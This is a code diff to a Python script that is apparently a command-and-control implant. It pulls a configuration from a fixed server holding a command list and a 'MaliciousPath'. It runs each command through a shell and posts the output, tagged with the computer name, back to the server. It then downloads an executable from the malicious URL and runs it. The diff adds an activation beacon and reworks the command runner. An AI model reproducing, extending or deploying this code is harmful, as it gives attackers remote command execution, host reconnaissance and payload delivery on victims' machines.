@@ -1,6 +1,8 @@
 import requests
 import json
 import sys, string, os
+import subprocess
+import datetime
 
 SERVERADDRESS = 'http://192.168.3.63'
 CONFIGURATIONPATH = '/Configuration'
@@ -28,21 +30,27 @@ def conf():
     global MALICIOUSURL
 
     conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
-    print(conf)
+    #print(conf)
     #print(json.dumps(conf))
     SERVERADDRESS = 'http://'+conf['Server']
     COMMANDSTOEXE = conf['Commands']
     MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']
 
 def RunCommand(command):
-    run = os.popen(command)
-    results = run.read()
-    run.close()
-    return results
+    run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
+    cmd_out, cmd_err = run.communicate()
+    return (cmd_out.decode("utf-8"))
 
 def PreperToSend(type,str):
     j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
     return j
+
+def Activate():
+    HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
+    if COMMANDSTOEXE is not None:
+        for command in COMMANDSTOEXE:
+            HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
+
 
 def DownloadFile(url):
     #file = url.split('/')[-1]+'.exe'
@@ -63,13 +71,12 @@ def RemoveFile(local_filename):
 def RunExeFile(file):
     os.system(file)
 
+
+
 conf()
-for command in COMMANDSTOEXE:
-    HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
+Activate()
 RunExeFile(DownloadFile(MALICIOUSURL))
 #print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))
-
-#RunExeFile(DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg'))
 
 #HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))
 
